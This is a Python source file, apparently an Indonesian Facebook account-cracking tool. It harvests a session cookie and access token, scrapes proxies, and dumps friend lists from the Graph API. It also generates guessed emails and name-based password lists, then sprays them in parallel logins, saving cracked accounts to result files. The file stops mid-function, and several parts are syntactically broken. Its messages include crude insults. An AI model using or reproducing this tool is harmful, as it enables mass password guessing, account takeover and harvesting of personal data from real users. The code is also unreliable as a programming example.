#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.console import Console
from rich.panel import Panel
from rich.style import Style
from rich import print
import requests
import geocoder
from rich.console import Console
import requests
from datetime import datetime
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests ipinfo ')
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nexus'
	e=random.randrange(100, 9999)
	f='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mozilla/5.0 (Linux; Android 13; Nexus 9P Build/Alpha2.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.1.1000.100 Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 13; Nexus 9P Build/Alpha2.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.1.1000.100 Safari/537.36'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mozilla/5.0 (X11; U; Linux i686; en-US) U2/1.0.0 UCBrowser/9.3.1.344'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
import datetime

#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1': 'Januari', '2': 'Februari', '3': 'Maret', '4': 'April', '5': 'Mei', '6': 'Juni', '7': 'Juli', '8': 'Agustus', '9': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
dic2 = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ WAKTU ]--------------#
import datetime
def waktu():
    now = datetime.datetime.now()
    hours = now.hour

    if 4 <= hours < 12:
        timenow = "[bold yellow]Selamat Pagi 👋"
    elif 12 <= hours < 15:
        timenow = "[bold green]Selamat Siang 👋"
    elif 15 <= hours < 18:
        timenow = "[bold orange3]Selamat Sore 👋"
    else:
        timenow = "[bold blue]Selamat Malam 👋"

    return timenow

# Memanggil fungsi
pesan_selamat = waktu()

# Menentukan lebar layar secara dinamis
lebar_layar = 80

# Menghitung jumlah spasi di awal untuk menengahkan pesan
spasi_awal = (lebar_layar - len(pesan_selamat)) // 2
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
def back():
    login()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.05)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
        time.sleep(0.05)

# ------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    prints(panel(f"""[bold red]               
           ██████╗ ██████╗  ██████╗ ███████╗
           ██╔══██╗██╔══██╗██╔═████╗╚════██║
           ██████╔╝██████╔╝██║██╔██║    ██╔╝
           ██╔══██╗██╔══██╗████╔╝██║   ██╔╝ 
           ██║  ██║██║  ██║╚██████╔╝   ██║  
            ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝                                      
             """,width=90, padding=(0, 8), title=f"\r", style=f"bold white"))
#--------------------[ AUTHOR ]--------------#
def author():
     prints(nel(f'                      {P2}[bold blue]Info Author{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
     print(f"✶[bold green] Author: [purple]Khoirul-Xd")
     print(f"✶[bold green] Status: [red]Premium")
     print(f"✶[bold green] WhatsApp: [blue]081283547452")
     print(f"✶[bold green] GitHub: [blue]https://github.com/khoirulez")
#--------------------[ USER ]--------------#
def info_user():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()

        alamat_ip = data.get('ip')
        region = data.get('region')
        lokasi = data.get('loc')
        kota = data.get('city')
        zona_waktu = data.get('timezone')
        
        prints(nel(f'                      {P2}[bold blue]Info User{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        print(f"✶[bold purple] Your Name: [blue]{sy2}")
        print(f"✶[bold purple] Your Idz: [blue]{sy3}")
        print(f"✶[bold purple] Expired: [blue]{end_time}")
        print(f"✶[bold purple] Your IP: [blue]{alamat_ip}")
        print(f"✶[bold purple] Region: [blue]{region}")
        print(f"✶[bold purple] Lokasi: [blue]{lokasi}")
        print(f"✶[bold purple] Kota: [blue]{kota}")
        print(f"✶[bold purple] Zona Waktu: [blue]{zona_waktu}")

    except Exception as e:
        print(f"Error: {e}")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
    try:
	    token = open('.token.txt','r').read()
	    cok = open('.cok.txt','r').read()
	    tokenku.append(token)
    except (IOError,KeyError,FileNotFoundError):
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	   try:
		   info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		   sy2 = info_datafb["name"]
		   sy3 = info_datafb["id"]
		   login(sy2,sy3)
	   except requests.exceptions.ConnectionError:
		   exit(f"\n{P} [:]{M} Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		login_lagi334()

def login_lagi334():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}]{U} Masukkan Cookies{x} :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.1; Elephone P4000 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/62.0.3202.66 Mobile Safari/537.36","referer": "https://x.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{H} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NJING !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN LOGIN ]----------------#
def login_menu():
	loading()
	os.system('clear')
	pepek()
	os.system('clear')
	banner()
	print(nel(" "* spasi_awal + pesan_selamat))
	author()
	info_user()
	prints(nel(f'                   {P2}[bold blue]Menu Tools Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	prints(f"""{P2}{color_text}01{P2} [bold green]Crack Massal    {color_text}04{P2} [bold green]Cek Ressult
{color_text}02{P2} [bold green]Crack Publik    {color_text}05{P2} [bold green]Crack File
{color_text}03{P2} [bold green]Clone ID Email  {color_text}00{P2} [bold green]Exit Program""",width=70,padding=(0,7),style=f"{color_panel}")
	___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
	if ___Sllowly_ID____ in ['1']:
		massal()
	elif ___Sllowly_ID____ in ['2']:
		prints(nel(f'               {P2}{H}Publik Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		idt = input('✶ ━━⫸ {H} ID Target{N} : ')
		dump(idt,"",{"Kue":cok},token)
		setting()
	elif ___Sllowly_ID____ in ['3']:
		mail2()
	elif ___Sllowly_ID____ in ['4']:
		result()
	elif ___Sllowly_ID____ in ['5']:
		file()
	elif ___Sllowly_ID____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .Kue.txt')
		print('>> [hijau] Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> {m} Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> {m}Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-------------------[PUBLIK]--------------------#    
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> {M}sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-----------------[ CRACK EMAIL ]-----------------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['mulyana','mulyono','ramdani','ramdan','ramadhan','ramadhani','saputra','syahputra','wijaya','kusuma','irawan','wirawan','setiawan','setyawan','hamdani','dermawan','sulaeman','pasundan','gumilang','gumilar','saepuloh','setiadi','rusmana','lesmana','suparman','hermansah','suherman','wijayanto','saripudin','saepudin','firmansyah','hidayat','kurnia','kurniawan','ramadani','muhamad','alamsyah','maulana','aprilia','apriliani','yulianti','julianti','sumiati','rahayu','saluyu','maharani','mulyani','rusmini','aisyah','fatimah','lestari','mulyati','damayanti','pertiwi','handayani','azizah','apipah','aropah','nuraisah','nurlaila','nursafitri','nurcahaya','nurjanah','nurfatimah','rahmawati','rosmawati','larasti','purnama','nurohman','nurahman','adinda','sumarni','sukaesih','bintang','kirana','cahyani','nurarsyila','amanda','sulastri','septiani','kartina','karlina','nuraropah','isabela','safitri','mawarni','rofikah','nengsih','ningsih','yuningsih','yunengsih','suningsih','sunengsih','malaka','azzahra','larasati','pertiwi','pratiwi','asyifa','aminah','nasution','sitorus','sinaga','sihombing','simamora','saepuloh','susanto','santoso','nursuci','khoerunisa','fitriani','sutomo','khan','singh','hartono','ruhyadi','ardiansyah','hardiansyah','herdiansyah','sinaga','prasti','kejora','rokayah','supriadi','willyam','wibowo','armada','darmawan','badriah','sulistia','fadilah','natalia','handayani','rusmiati','nurahma,nursakila,salsabila','hungkul','sayang','gaming','utama','pertama','peratama','pratama']
	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] {U}nama target{N} : ')
	if ',' in str(nama):
		print(f' └─[red] masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = input(f'{P}[{H}?{P}] {U} domain (ex:@gmail.com){N} : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f' └─[red]  masukkan domain dengan benar ')
		time.sleep(3);exit()
	jumlah = input(f'{P}[{H}?{P} ]{U}total dump (max:10000){N} : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
		sys.stdout.write(f"\r{P}[{H}±{P}] {U} berhasil mengumpulkan {asu}{len(id)} {U}email...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/downloads/')
	except FileNotFoundError:
		print(' [+] [red]File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] [red] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] [red] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] [red] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	clear()
	loading()
	clear()
	banner()
	print(f'[01] [white]Hasil [green]OK [white]Anda ')
	print(f'[02] [white]Hasil [yellow]CP [white]Anda ')
	kz = input(f' └──{H} Pilih : ')
	if kz in ['02','2']:
		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' └─[red] file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' └─[red] anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └──{H} Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' └─[red] pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' └─[red] file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' └─[red] file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' └─[red] anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └──{H} Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' └─[red] pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' └─[red] file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1		
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' └─[red] pilih yang bener kontol ')
		back()
###----------[ CRACK MASSAL ]----------###
def massal():
	prints(nel(f'               {P2}[blue]Massal Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{U}Mau Berapa ID ?{N} : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{U}ID Ke{N}  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,Kues={'Kues':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("[purple]Total DUMP{N}  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
###----------[ ATUR SBLUM KREK ]----------###
def setting():
	prints(nel(f'                   {P2}[blue]login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	cetak(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2}{U} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")
	hu = input(f'✶ ━━⫸{H} Input :{H} ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua) 
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(f'         {P2}[red]Input Tidak Diketahui{P2}',width=70,padding=(0,7),style=f"{color_panel}")
		exit()
	prints(nel(f'               {P2}[blue]login Method{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	prints(f'{P2}[{color_text}01{P2}]. Method free.facebook.com [[green] Validate [white]]\n[{color_text}02{P2}]. Method m.facebook.com [[green] Async [white]]\n[{color_text}03{P2}]. Method graph.facebook.com [[green] B-Api [white]]',width=70,padding=(0,7),style=f"{color_panel}")
	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
	if hc in ['1','01']:
		method.append('metod1')
	elif hc in ['2','02']:
		method.append('metod2')
	elif hc in ['3','03']:
		method.append('metod3')
	elif hc in ['4','04']:
		method.append('metod4')
	else:
		method.append('metod1')
	print('')
	_jembot_ = input('✶ ━━⫸{U} Tambahkan Aplikasi Terkait{N} ( Y/t ) ')
	if _jembot_ in ['']:
		print(' Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	prints(nel(f'              {P2}[blue]Manual Password?{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'>> {H}Masukan kata sandi tambahan contoh{N} : {M}bagong,ngentod {N} \n>> {H}Saran kata sandi daeraah Target Contoh{N} :{M} kalimantan,bandung,jonggol{N}')
		pwku=input(f'✶ ━━⫸ {H}Masukkan Password Tambahan {N}: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	clear()
	loading()
	clear()
	banner()
	prints(nel(f'       {P2}{M2}!{P2}{H} PROSES CRACK SEDANG BERLANGSUNG{M2} !{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'metod1' in method:
				pool.submit(crack,idf,pwv)
			elif 'metod2' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'metod3' in method:
				pool.submit(metod3,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print(f'[[blue]•] OK : {h}%s '%(ok))
	print(f'[[blue]•]CP : {k}%s '%(cp))
#--------------------[ METODE VALIDATE ]-----------------#
def validate1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
